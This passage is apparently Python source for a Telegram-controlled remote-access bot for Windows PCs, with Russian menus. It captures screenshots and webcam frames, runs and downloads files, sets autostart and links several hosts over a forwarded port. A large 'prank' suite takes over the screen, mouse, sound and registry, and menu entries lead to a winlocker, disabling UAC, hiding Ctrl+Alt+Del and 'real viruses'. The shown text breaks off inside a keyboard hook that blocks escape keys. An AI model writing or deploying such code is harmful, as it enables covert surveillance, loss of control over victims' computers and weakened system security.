def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton(t, callback_data=d) for t, d in row] for row in rows])

def host_online(base: str) -> bool:
    if base == MASTER_NAME:
        return True
    return bool(SEEN_HOSTS.get(base, {}).get("online"))

def menu_text(chat_id: int | None = None) -> str:
    now = datetime.datetime.now().strftime("%H:%M:%S")
    who = SESS.get(chat_id) or MASTER_NAME
    dot = "🟢" if host_online(who) else "⚪️ офлайн"
    return (f"🛠 <b>ПУЛЬТ · 👤 {html.escape(HOST_TITLES.get(who, who))} {dot}</b>\n"
            f"🖥 {now} · жду команду\n"
            "Выбери, что сделать 👇")

ROWS_MAIN = [
    [("📸 Скриншот", "shot"), ("📊 Статус", "status")],
    [("🎥 Вебка", "webcam"), ("🚀 Запустить файл", "run")],
    [("📥 Скачать по ссылке", "dl"), ("📤 Загрузить файл", "upload")],
    [("🌆 Обои с фото", "wallpaper"), ("😂 Шутки", "jokes")],
    [("♻️ Автозапуск ВКЛ", "pauto_on"), ("♻️ Автозапуск ВЫКЛ", "pauto_off")],
    [("😈 Приколы", "pranks")],
    [("🛰 Сменить хоста", "whoami")],
]

def menu_kb() -> InlineKeyboardMarkup:
    return kb(*ROWS_MAIN)

# ---------- экран «ХОСТЫ» (СМЕНА ХОСТА, переписан с нуля) ----------
def host_names() -> list[str]:
    """список хостов: мастер первым, дальше все запомненные"""
    return [MASTER_NAME] + sorted(SEEN_HOSTS)

def hosts_text() -> str:
    names = host_names()
    n_on = sum(1 for n in names if host_online(n))
    host_lines = []
    for n in names:
        mark = "🟢" if host_online(n) else "⚪️"
        extra = " — эта машина" if n == MASTER_NAME else ""
        host_lines.append(f"{mark} {html.escape(HOST_TITLES.get(n, n))}{extra}")
    return (f"🛰 <b>СМЕНА ХОСТА</b> · в сети <b>{n_on}</b> из <b>{len(names)}</b>\n\n"
            + "\n".join(host_lines)
            + "\n\nкак подключить вторую машину:\n"
              "та же сеть — просто запусти там этот же main.py, найдёт мастера сама;\n"
              'другой интернет — строка в её main.py: NODE_ADDR = "IP:7731"\n'
              "(адрес печатает консоль мастера) + проброс порта 7731 на мастер-ПК")

def hosts_kb(chat_id: int | None = None) -> InlineKeyboardMarkup:
    cur = SESS.get(chat_id) if chat_id else None
    rows = []
    for n in host_names():
        dot = "🟢" if host_online(n) else "⚪️"
        check = "✅" if cur == n else "🔹"
        tag = " (эта машина)" if n == MASTER_NAME else ""
        rows.append([(f"{check}{dot} " + HOST_TITLES.get(n, n) + tag, "hostsel:" + n)])
    rows.append([("🔄 Обновить", "hostup"), ("⬅️ Меню", "main")])
    return kb(*rows)

async def refresh_host_panels(app, chat_skip: int | None = None):
    """экран «ХОСТЫ» открыт — после появления/ухода ноды панель перерисуется сама"""
    for chat_id, view in list(VIEW.items()):
        if view != "hosts" or chat_id == chat_skip:
            continue
        mid = PANEL.get(chat_id)
        if not mid:
            continue
        with contextlib.suppress(Exception):
            await app.bot.edit_message_text(hosts_text(), chat_id=chat_id, message_id=mid,
                                            reply_markup=hosts_kb(chat_id), parse_mode="HTML")

async def host_event(app, base: str, online: bool, chat_skip: int | None = None):
    """хост появился/возможен уход: уведомление в чаты + перерисовка списков"""
    if online:
        mark = kb([[("✅ Подключиться: " + base, "hostsel:" + base)],
                   [("🛰 Список хостов", "whoami")]])
        text = f"🛰 <b>ХОСТ В СЕТИ:</b> {html.escape(base)}\nподключить панель к нему?"
        for chat_id in list(KNOWN_CHATS):
            if chat_id == chat_skip:
                continue
            with contextlib.suppress(Exception):
                await app.bot.send_message(chat_id, text, reply_markup=mark, parse_mode="HTML")
    else:
        text = f"⚪️ хост ушёл: {html.escape(base)}"
        for chat_id in list(KNOWN_CHATS):
            with contextlib.suppress(Exception):
                await app.bot.send_message(chat_id, text)
    await refresh_host_panels(app, chat_skip)

def joke_kb() -> InlineKeyboardMarkup:
    return kb([("🎲 Случайная шутка", "joke")], [("⬅️ Меню", "main")])

def pranks_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🪟 Экран и окна", "cat_screen"), ("🖱 Периферия", "cat_mouse")],
        [("🖥 Стол и темы", "cat_desktop"), ("🔊 Звук", "cat_sound")],
        [("🏴 Жёсткие (18+)", "cat_hard"), ("💀 КОМБО", "cat_combo")],
        [("🙈 Система-шутки", "cat_sys"), ("☠️ ВИРУСЫ (настоящие)", "cat_virus")],
        [("⬅️ Меню", "main")],
    )

def cat_screen_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🖥 БСОД", "pr_bsod"), ("💾 Фейк-апдейт", "pr_update")],
        [("🎵 Рикролл", "pr_rick"), ("🖼 Экран наизнанку", "pr_invert")],
        [("🖥 Блэк-аут", "pr_blackout"), ("📱 Экран выкл", "pr_monoff")],
        [("🔄 Экран на 90°", "pr_rotate"), ("🪟 Стол фликер", "pr_flicker")],
        [("🪟 Танцующее окно", "pr_dance"), ("⬅️ Приколы", "pranks")],
    )

def cat_mouse_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🍕 Флуд cmd", "floodcmd"), ("💬 Окон-бомба", "floodpop")],
        [("🌀 Мышь пьяная", "flooddrunk"), ("🧲 Мышь к центру", "pr_magnet")],
        [("🧲 Мышь от углов", "pr_edges"), ("🔒 Курсор в клетке", "pr_jail")],
        [("🙃 Мышь swap", "pr_swap"), ("💿 CDROM — открой!", "pr_cd")],
        [("⛔ Стоп безумия", "stopflood"), ("⬅️ Приколы", "pranks")],
    )

def cat_desktop_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🖼 Значки убрать/вернуть", "pr_icons"), ("🌆 Обои = скриншот", "pr_wallsub")],
        [("🖼 Обои «Я ВСЁ ВИЖУ»", "pr_wallstare"), ("🧷 Вернуть обои", "pr_wallback")],
        [("🗒 Блокнот-прикол", "pr_notepad"), ("⬅️ Приколы", "pranks")],
    )

def cat_sound_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🎵 Мелодия спикера", "pr_beep"), ("🎺 Сирена 15с", "pr_siren")],
        [("🗣 Голос из ниоткуда", "pr_voice"), ("🔊 Громкость MAX", "pr_volume")],
        [("⌨️ Caps-стрекот", "pr_caps"), ("▶️ Плеер дёргать", "pr_player")],
        [("⬅️ Приколы", "pranks")],
    )

def cat_hard_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🏴 WINLOCKER", "pr_winlock"), ("🧨 Театр format C:", "pr_format")],
        [("👁 Хакер-взлом", "pr_hacker"), ("🔋 Заряд 1%", "pr_battery")],
        [("🚨 Скример", "pr_screamer"), ("🖥 Блок ПК", "pr_lock")],
        [("💬 Сарказм ×5", "pr_msgbox"), ("⬅️ Приколы", "pranks")],
    )

def cat_combo_kb() -> InlineKeyboardMarkup:
    return kb(
        [("☠️ Конец света (КОМБО)", "pr_apocalypse")],
        [("💀 СУДНАЯ НОЧЬ 2.0", "pr_judgment")],
        [("⬅️ Приколы", "pranks")],
    )

def cat_sys_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🙈 Спрятать Ctrl+Alt+Del", "pr_hkhide"), ("🙈 Вернуть", "pr_hkshow")],
        [("🔒 UAC OFF", "pr_uacoff"), ("🔓 UAC ON", "pr_uacon")],
        [("⬅️ Приколы", "pranks")],
    )

def prompt_kb() -> InlineKeyboardMarkup:
    return kb([("✖️ Отмена", "cancel"), ("⬅️ Меню", "main")])

async def panel_edit(chat_id: int, ctx: ContextTypes.DEFAULT_TYPE,
                     mid: int, text: str, markup: InlineKeyboardMarkup) -> bool:
    try:
        await ctx.bot.edit_message_text(text, chat_id=chat_id, message_id=mid,
                                        reply_markup=markup, parse_mode="HTML")
        PANEL[chat_id] = mid
        return True
    except Exception:
        return False   # сообщение умерло/уплыло — панель переродится ниже

async def set_panel(chat_id: int, ctx: ContextTypes.DEFAULT_TYPE,
                    text: str, markup: InlineKeyboardMarkup):
    """одна панель на чат: правит ТУ ЖЕ панель, новое сообщение — только если старое померло"""
    mid = PANEL.get(chat_id)
    if mid and await panel_edit(chat_id, ctx, mid, text, markup):
        return
    m = await ctx.bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
    PANEL[chat_id] = m.message_id

async def send_menu(chat_id: int, ctx: ContextTypes.DEFAULT_TYPE):
    VIEW[chat_id] = "main"
    await set_panel(chat_id, ctx, menu_text(chat_id), menu_kb())

# ---------- быт ----------
def launch_by_path(file_path: str) -> str:
    p = Path(file_path)
    if not p.is_file():
        return f"❌ файл не найден: {p}"
    if p.suffix.lower() == ".bat":
        subprocess.run(["cmd.exe", "/c", str(p)], check=True)
        return f"🚀 .bat исполнен: {p}"
    os.startfile(str(p))
    return f"🚀 запущено: {p}"

# ---------- инструменты прикалов (из 2.py) ----------
def press_key(vk: int, times: int = 1):
    user32 = ctypes.windll.user32
    for _ in range(times):
        user32.keybd_event(vk, 0, 0, 0)   # down
        user32.keybd_event(vk, 0, 2, 0)   # up
        time.sleep(0.01)

class _POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

def snapshot_webcams(max_cams: int = 5) -> list[tuple[int, bytes]]:
    """перебирает индексы камер, снимает кадр, возвращает (индекс, jpeg-байты)"""
    import cv2
    out: list[tuple[int, bytes]] = []
    for i in range(max_cams):
        cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)   # быстрый бэкенд, без MSMF-проверок
        if not cap.isOpened():
            continue
        frame = None
        for _ in range(4):                         # прогрев: первые кадры бывают чёрными
            got, fr = cap.read()
            if got and fr.mean() > 4:
                frame = fr
                break
            time.sleep(0.12)
        cap.release()
        if frame is None:
            continue
        ok, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
        if ok:
            out.append((i, buf.tobytes()))
    return out

class _POINT_A(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

class _RECT_A(ctypes.Structure):
    _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                ("right", ctypes.c_long), ("bottom", ctypes.c_long)]

class _KBDLLHOOK(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]

class _MSG_A(ctypes.Structure):
    class _PT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
    _fields_ = [("hwnd", wintypes.HWND), ("message", wintypes.UINT),
                ("wParam", wintypes.WPARAM), ("lParam", wintypes.LPARAM),
                ("time", wintypes.DWORD), ("pt", _PT)]

_KBDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
                              wintypes.WPARAM, wintypes.LPARAM)

def prank_busy(jid: str) -> bool:
    if pranks_running.get(jid):
        return True
    pranks_running[jid] = True
    return False

# ---------- приколы: экран и окна ----------
def _bsod_worker():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="#0078D7")
        root.focus_force()
        pct = {"v": 0}
        tk.Label(root, text="🙁", font=("Segoe UI Emoji", 120), fg="white", bg="#0078D7"
                 ).place(relx=0.18, rely=0.20, anchor="w")
        tk.Label(root, text="Система уничтожает пользовательские файлы.\nПожалуйста, не закрывайте окно.",
                 font=("Segoe UI", 18), fg="white", bg="#0078D7", justify="left"
                 ).place(relx=0.18, rely=0.40, anchor="w")
        pr = tk.Label(root, text="", font=("Segoe UI", 18), fg="white", bg="#0078D7")
        pr.place(relx=0.18, rely=0.54, anchor="w")
        cur = tk.Label(root, text="", font=("Consolas", 12), fg="#cfe2ff", bg="#0078D7")
        cur.place(relx=0.18, rely=0.65, anchor="w")
        VICTIMS = [
            r"Users\Пк\Documents\диплом_финал_финал2.docx",
            r"Users\Пк\Pictures\серия_лучших_селфи",
            r"Users\Пк\Documents\пароли_новые_не_удалил.txt",
            r"D:\архив\за_5_лет\всё_важное",
            r"Users\Пк\Music\плейлист_души",
            r"C:\Windows\System32\надеюсь_это_не_всё",
        ]
        def tick():
            if not root.winfo_exists():
                return
            pct["v"] = min(100, pct["v"] + random.randint(3, 11))
            pr.config(text=f"Уничтожено: {pct['v']}%")
            cur.config(text="удаляем: " + random.choice(VICTIMS))
            if pct["v"] >= 100:
                cur.config(text="шутка. файлы на месте. ESC выход")
                root.after(3500, root.destroy)
                return
            root.after(random.randint(400, 1000), tick)
        root.after(400, tick)
        root.bind("<Escape>", lambda e: root.destroy())
        root.bind("<Button-1>", lambda e: root.destroy())
        root.after(45000, root.destroy)
        root.mainloop()
    except Exception:
        pass

def _p_bsod() -> str:
    threading.Thread(target=_bsod_worker, daemon=True).start()
    return "🖥 синий гость делает вид, что стерёт твою жизнь (ESC выручает)"

def _fullscreen_window(bg: str, lines: list[tuple[str, int]], slow_pct: bool):
    def run():
        try:
            import tkinter as tk
            r = tk.Tk()
            r.attributes("-fullscreen", True)
            r.attributes("-topmost", True)
            r.overrideredirect(True)
            r.configure(bg=bg)
            frame = tk.Frame(r, bg=bg)
            frame.pack(expand=True)
            pct_lbl = None
            for txt, size in lines:
                w = tk.Label(frame, text=txt, bg=bg, fg="white", font=("Segoe UI", size, "bold"))
                w.pack(pady=6)
                if "%" in txt: pct_lbl = w
            if slow_pct:
                state = {"v": 0}
                def tick():
                    if not r.winfo_exists():
                        return
                    state["v"] += random.randint(0, 3)
                    if state["v"] > 90: state["v"] = 0        # прогресс снова в ноль — смех ART
                    if pct_lbl: pct_lbl.config(text=f"Выполнено: {state['v']}%")
                    r.after(2200, tick)
                tick()
            r.bind("<Escape>", lambda e: r.destroy())
            r.focus_force()
            r.mainloop()
        except Exception:
            pass
    threading.Thread(target=run, daemon=True).start()

def _p_update() -> str:
    _fullscreen_window("#003A6D", [
        ("Обновление Windows", 34), ("0% завершено", 20),
        ("Не выключайте компьютер", 13),
    ], slow_pct=True)
    return "🔄 фейк-обновление пошло — 0% может подняться до 90 и уйти снова в ноль (ESC — выход)"

def rickroll() -> str:
    url = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&loop=1&playlist=dQw4w9WgXcQ"
    browsers = [
        (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "--edge-kiosk-type=fullscreen"),
        (r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",       "--edge-kiosk-type=fullscreen"),
        (r"C:\Program Files\Google\Chrome\Application\chrome.exe",        ""),
        (r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",  ""),
    ]
    for path, extra in browsers:
        if os.path.exists(path):
            args = [path, f"--kiosk={url}", "--autoplay-policy=no-user-gesture-required",
                    "--no-first-run", "--new-window"]
            if extra: args.append(extra)
            subprocess.Popen(args)
            return "🎵 рикролл на весь экран (выйти: Alt+F4)"
    os.startfile(url)
    return "🎵 рикролл открылся обычной вкладкой — киоска нет, но напряжение есть"

def _invert_worker():
    try:
        import tkinter as tk
        img = ImageGrab.grab(all_screens=True).convert("RGB")
        neg = ImageOps.invert(img)
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="black")
        w, h = root.winfo_screenwidth(), root.winfo_screenheight()
        photo = ImageTk.PhotoImage(neg.resize((w, h)))
        tk.Label(root, image=photo, border=0).place(x=0, y=0)
        root.focus_force()
        root.bind("<Escape>", lambda e: root.destroy())
        root.bind("<Button-1>", lambda e: root.destroy())
        root.after(15000, root.destroy)
        root.mainloop()
    except Exception:
        pass

def _p_invert() -> str:
    threading.Thread(target=_invert_worker, daemon=True).start()
    return "🖼 экран вывернулся наизнанку — вернётся через 15с (ESC — сразу)"

def _p_screamer() -> str:
    threading.Thread(target=_invert_worker, daemon=True).start()
    try:
        import winsound
        for f in (1800, 1300, 1800):
            winsound.Beep(f, 320)
    except Exception:
        pass
    return "🚨 скример ушёл: негатив + визг 3 секунды"

def _blackout_worker(mute_secs: int = 8, hint: str = ";) это шутка — ESC выручит"):
    deadline = time.time() + mute_secs
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="black")
        root.focus_force()
        lbl = tk.Label(root, text="", font=("Segoe UI", 44, "bold"),
                       fg="#c0392b", bg="black")
        lbl.place(relx=0.5, rely=0.5, anchor="center")
        sub = tk.Label(root, text="", font=("Consolas", 16), fg="#555555", bg="black")
        sub.place(relx=0.5, rely=0.62, anchor="center")
        def kill(e=None):
            if time.time() >= deadline:
                root.destroy()
        root.bind("<Button-1>", kill)
        root.bind("<Escape>", kill)
        root.after(mute_secs * 1000 + 1, lambda: lbl.config(text=hint))
        root.after(mute_secs * 1000 + 1200, lambda: sub.config(text="клик тоже работает"))
        root.after(20000, root.destroy)
        root.mainloop()
    except Exception:
        pass

def _p_blackout() -> str:
    threading.Thread(target=_blackout_worker, daemon=True).start()
    return "🖥 экран ушёл в чёрный — первые 8с без подсказок, 20с максимум"

def _p_monoff() -> str:
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
    return "📱 экран выключен — шевельни мышью, чтобы вернуть"

def rotate_display() -> str:
    class DEVMODE(ctypes.Structure):
        _fields_ = [
            ("dmDeviceName", ctypes.c_wchar * 32), ("dmSpecVersion", ctypes.c_ushort),
            ("dmDriverVersion", ctypes.c_ushort), ("dmSize", ctypes.c_ushort),
            ("dmDriverExtra", ctypes.c_ushort), ("dmFields", ctypes.c_ulong),
            ("dmOrientation", ctypes.c_short), ("dmScale", ctypes.c_short),
            ("dmCopies", ctypes.c_short), ("dmDefaultSource", ctypes.c_short),
            ("dmPosition_x", ctypes.c_long), ("dmPosition_y", ctypes.c_long),
            ("dmDisplayOrientation", ctypes.c_ulong), ("dmDisplayFixedOutput", ctypes.c_ulong),
            ("dmFormName", ctypes.c_wchar * 32), ("dmLogPixels", ctypes.c_ushort),
            ("dmBitsPerPel", ctypes.c_ulong), ("dmPelsWidth", ctypes.c_ulong),
            ("dmPelsHeight", ctypes.c_ulong), ("dmDisplayFlags", ctypes.c_ulong),
            ("dmDisplayFrequency", ctypes.c_ulong),
        ]
    dm = DEVMODE()
    dm.dmSize = ctypes.sizeof(DEVMODE)
    if not ctypes.windll.user32.EnumDisplaySettingsW(None, -1, ctypes.byref(dm)):
        return "🖥 не поворачивается (драйвер запретил)"
    names = ["горизонтально", "на 90°", "вверх ногами", "на 270°"]
    dm.dmDisplayOrientation = (dm.dmDisplayOrientation + 1) % 4
    if ctypes.windll.user32.ChangeDisplaySettingsExW(None, ctypes.byref(dm), None, 0, None) == 0:
        return f"🖥 экран повернулся: {names[dm.dmDisplayOrientation]} (тапай ещё — вернётся)"
    return "🖥 не повернулся — драйвер запретил"

def _p_flicker() -> str:
    user32 = ctypes.windll.user32
    for _ in range(15):
        user32.keybd_event(0x5B, 0, 0, 0)     # LWIN down
        user32.keybd_event(0x44, 0, 0, 0)     # D down
        user32.keybd_event(0x44, 0, 2, 0)
        user32.keybd_event(0x5B, 0, 2, 0)
        time.sleep(0.3)
    return "🪟 рабочий стол моргал 15 раз"

def _p_dance() -> str:
    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    class RECT(ctypes.Structure):
        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
                    ("r", ctypes.c_long), ("b", ctypes.c_long)]
    rc = RECT()
    user32.GetWindowRect(hwnd, ctypes.byref(rc))
    w, h = rc.r - rc.l, rc.b - rc.t
    try:
        for _ in range(60):
            user32.MoveWindow(hwnd, rc.l + random.randint(-120, 120),
                              rc.t + random.randint(-70, 70), w, h, True)
            time.sleep(0.08)
    finally:
        user32.MoveWindow(hwnd, rc.l, rc.t, w, h, True)
    return "🪟 окно потанцевало и вернулось на место"

# ---------- приколы: периферия ----------
async def prank_flood_task(uid: int, chat_id: int):
    i = 0
    while uid not in flood_stop:
        i += 1
        subprocess.Popen(f"start \"\" /MAX cmd /k \"title окно №{i} — привет от бота\"",
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await asyncio.sleep(0.35)

async def popup_bomb_task(uid: int, chat_id: int):
    popup = DATA_DIR / "popup.vbs"
    popup.write_text('x = MsgBox("Ваш скучный день закончился! Нажмите ок, если это правда", 64, "Окошко от бота")',
                     encoding="cp1251")
    while uid not in flood_stop:
        subprocess.Popen(["wscript", str(popup)], creationflags=subprocess.CREATE_NO_WINDOW)
        await asyncio.sleep(0.6)

async def mouse_drunk_task(uid: int, chat_id: int):
    p = _POINT_A()
    while uid not in flood_stop:
        ctypes.windll.user32.GetCursorPos(ctypes.byref(p))
        ctypes.windll.user32.SetCursorPos(p.x + random.randint(-45, 45), p.y + random.randint(-45, 45))
        await asyncio.sleep(0.1)

def _p_magnet() -> str:
    user32 = ctypes.windll.user32
    end = time.time() + 10
    cx, cy = user32.GetSystemMetrics(0) // 2, user32.GetSystemMetrics(1) // 2
    while time.time() < end:
        user32.SetCursorPos(cx, cy)
        time.sleep(0.15)
    return "🧲 мышь льнула к центру 10 секунд"

def _p_edges() -> str:
    user32 = ctypes.windll.user32
    end = time.time() + 15
    w, h = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
    pt = _POINT_A()
    margin = 80
    while time.time() < end:
        user32.GetCursorPos(ctypes.byref(pt))
        if pt.x < margin or pt.x > w - margin or pt.y < margin or pt.y > h - margin:
            user32.SetCursorPos(w // 2 + random.randint(-120, 120),
                                h // 2 + random.randint(-90, 90))
        time.sleep(0.05)
    return "🧲 углы экрана были закрыты 15 секунд"

def _jail_worker(seconds: int = 20):
    """ClipCursor-клетка: курсор живёт в квадрате 56×56, ESC — ранний выход,
    watchdog вернёт ClipCursor(None) даже если всё рухнет"""
    user32 = ctypes.windll.user32
    pt = _POINT_A()
    user32.GetCursorPos(ctypes.byref(pt))
    cx, cy = max(80, pt.x), max(80, pt.y)
    half = 28
    box = _RECT_A(cx - half, cy - half, cx + half, cy + half)
    freed = threading.Event()

    def watchdog():
        freed.wait(timeout=seconds + 10)
        user32.ClipCursor(None)

    threading.Thread(target=watchdog, daemon=True).start()

    def render():
        try:
            import tkinter as tk
            jail = tk.Tk()
            jail.overrideredirect(True)
            jail.attributes("-topmost", True)
            size = half * 2
            jail.geometry(f"{size}x{size}+{cx - half}+{cy - half}")
            jail.configure(bg="#ff2b2b")
            tk.Label(jail, text="🔒\nЗАЛ", font=("Segoe UI Emoji", 16, "bold"),
                     fg="#ff2b2b", bg="#000000", justify="center"
                     ).pack(expand=True, fill="both")
            end = time.time() + seconds
            def tick():
                if time.time() >= end or freed.is_set() or (user32.GetAsyncKeyState(0x1B) & 0x0001):
                    jail.destroy()
                    return
                user32.ClipCursor(ctypes.byref(box))
                user32.SetCursorPos(cx + random.randint(-5, 5), cy + random.randint(-5, 5))
                jail.after(50, tick)
            tick()
            jail.mainloop()
        except Exception:
            pass
        finally:
            freed.set()
            user32.ClipCursor(None)

    threading.Thread(target=render, daemon=True).start()

def _p_jail() -> str:
    threading.Thread(target=_jail_worker, kwargs={"seconds": 20}, daemon=True).start()
    return "🔒 курсор в клетке 20с. держи ESC — вырвешься раньше"

def mouse_toggle() -> str:
    cur = bool(ctypes.windll.user32.GetSystemMetrics(23))
    new = not cur
    ctypes.windll.user32.SwapMouseButton(new)
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse") as k:
        winreg.SetValueEx(k, "SwapMouseButton", 0, winreg.REG_SZ, "1" if new else "0")
    return "🙃 кнопки мыши поменялись местами" if new else "🙃 мышь вернулась в привычку"

def _p_cd() -> str:
    winmm = ctypes.windll.winmm
    buf = ctypes.create_unicode_buffer(256)
    if winmm.mciSendStringW("set cdaudio door open", buf, 256, 0) != 0:
        return "💿 привода нет — шутка не взлетела"
    time.sleep(2)
    winmm.mciSendStringW("set cdaudio door closed", buf, 256, 0)
    return "💿 привод открылся и захлопнулся обратно"

# ---------- приколы: стол и темы ----------
ADV_PATH = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"

def icons_toggle() -> str:
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, ADV_PATH) as k:
        try: cur = winreg.QueryValueEx(k, "HideIcons")[0]
        except FileNotFoundError: cur = 0
        new = not cur
        winreg.SetValueEx(k, "HideIcons", 0, winreg.REG_DWORD, 1 if new else 0)
    subprocess.Popen('taskkill /f /im explorer.exe && timeout /t 1 /nobreak >nul && start explorer.exe',
                     shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    return "🖼 значки рабочего стола исчезли — ищем" if new else "🖼 значки вернулись на место"

def _wall_get() -> str:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop") as k:
            return winreg.QueryValueEx(k, "Wallpaper")[0] or ""
    except Exception:
        return ""

def _wall_set(path: str):
    SPI_SETDESKWALLPAPER = 0x14
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)

def _p_wallpaper() -> str:
    orig = _wall_get()
    marker = DATA_DIR / "orig_wall.txt"
    if orig and not marker.exists():
        marker.write_text(orig, encoding="utf-8")
    shot = ImageGrab.grab(all_screens=True).convert("RGB")
    fake = DATA_DIR / "fake_wall.png"
    shot.save(fake, "PNG")
    _wall_set(str(fake))
    return ("🖼 обои стали скриншотом экрана — рабочий стол выглядит живым, но не дышит. "
            "🧷 вернёт старые обои")

def _p_wallstare() -> str:
    orig = _wall_get()
    marker = DATA_DIR / "orig_wall.txt"
    if orig and not marker.exists():
        marker.write_text(orig, encoding="utf-8")
    shot = ImageGrab.grab(all_screens=True).convert("RGB")
    d = ImageDraw.Draw(shot)
    try:
        font = ImageFont.truetype("arialbd.ttf", 140)
    except Exception:
        font = ImageFont.load_default()
    d.text((shot.width // 2, 90), "Я ВСЁ ВИЖУ", anchor="mm",
           font=font, fill=(255, 30, 30))
    fake = DATA_DIR / "fake_wall.png"
    shot.save(fake, "PNG")
    _wall_set(str(fake))
    return "🖼 обои теперь со скриншотом и надписью «Я ВСЁ ВИЖУ» — 🧷 вернёт старые"

def _wall_restore() -> str:
    marker = DATA_DIR / "orig_wall.txt"
    if not marker.exists():
        return "🧷 оригинал не записывался — возвращать нечего"
    path = marker.read_text(encoding="utf-8").strip() or ""
    if not path or not Path(path).exists():
        return "🧷 файл старых обоев пропал — верни вручную (Правый клик → Персонализация)"
    _wall_set(path)
    marker.unlink()
    return "🧷 старые обои восстановлены"

def type_text(text: str):
    """печатает текст в активное окно через SendInput (unicode)"""
    class KEYBDINPUT(ctypes.Structure):
        _fields_ = [("wVk", wintypes.WORD), ("wScan", wintypes.WORD),
                    ("dwFlags", wintypes.DWORD), ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]
    class INPUT(ctypes.Structure):
        class _I(ctypes.Union):
            _fields_ = [("ki", KEYBDINPUT), ("pad", ctypes.c_byte * 32)]
        _anonymous_ = ("i",)
        _fields_ = [("type", wintypes.DWORD), ("i", _I)]
    user32 = ctypes.windll.user32
    def send(chip: INPUT):
        user32.SendInput(1, ctypes.byref(chip), ctypes.sizeof(INPUT))
    for ch in text:
        inp = INPUT()
        inp.type = 1                                # INPUT_KEYBOARD
        if ch == "\n":
            inp.i.ki.wVk = 0x0D                     # RETURN
            send(inp)
            inp.i.ki.dwFlags = 2
            send(inp)
        else:
            inp.i.ki.wScan = ord(ch)
            inp.i.ki.dwFlags = 4                    # KEYEVENTF_UNICODE
            send(inp)
            inp.i.ki.dwFlags = 6                    # + KEYUP
            send(inp)
        time.sleep(0.004)

def _p_notepad() -> str:
    for i in range(3):
        subprocess.Popen("notepad.exe")
        time.sleep(1.2)
        type_text("это не баг — это шутка :)\nбудет весело, не выключай\n")
    return "🗒 3 блокнота выдали тайну"

def set_wallpaper(path: Path) -> str:
    SPI_SETDESKWALLPAPER = 20
    r = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, str(path), 3)
    return "🌆 обои поставлены" if r else "🌆 обои не взялись (нужен jpg/bmp)"

# ---------- приколы: звук ----------
def _p_beep() -> str:
    try:
        import winsound
        notes = [392, 440, 494, 587, 494, 440, 392, 349, 330, 294, 330, 392, 262]
        for f in notes:
            winsound.Beep(f, 300)
        return "🎵 бип-мелодия отзвенела"
    except Exception:
        return "🔇 звукового устройства нет — тишина в зале"

def _p_siren() -> str:
    try:
        import winsound
        end = time.time() + 15
        hi = False
        while time.time() < end:
            winsound.Beep(750 if hi else 950, 420)
            hi = not hi
    except Exception:
        pass
    return "🎺 сирена отзвенела — соседи в курсе"

def _p_voice() -> str:
    phrase = "Привет! Твой компьютер был перепрошит. Сядь ровно и не забудь про осанку."
    ps = ("$v = New-Object -ComObject SAPI.SpVoice; $v.Rate = 3; $v.Volume = 100; "
          f"$v.Speak('{phrase}')")
    try:
        subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                       capture_output=True, timeout=30)
    except subprocess.TimeoutExpired:
        pass
    return "🗣 голос из ниоткуда изрёк мудрость"

def _p_volume() -> str:
    for _ in range(100):
        press_key(0xAF)
    return "🔊 громкость в потолок"

def _p_caps() -> str:
    for _ in range(30):
        press_key(0x14)
        time.sleep(0.04)
    return "⌨️ capslock отщёлкал 30 раз"

def _p_player() -> str:
    for _ in range(25):
        press_key(0xB3)                       # VK_MEDIA_PLAY_PAUSE
        time.sleep(0.08)
    return "▶️ плеер заикался 25 раз"

# ---------- приколы: жёсткие (18+) ----------
KB_CODE = "0007"    # секретный код владельца — цифры подряд на клавиатуре

def _hook_thread(stop_evt: threading.Event, unlock_evt: threading.Event,
                 ring: dict, deadline: float):
    """WH_KEYBOARD_LL: жрёт WIN / Alt+Tab / Alt+F4 / ESC, цифры пишет только
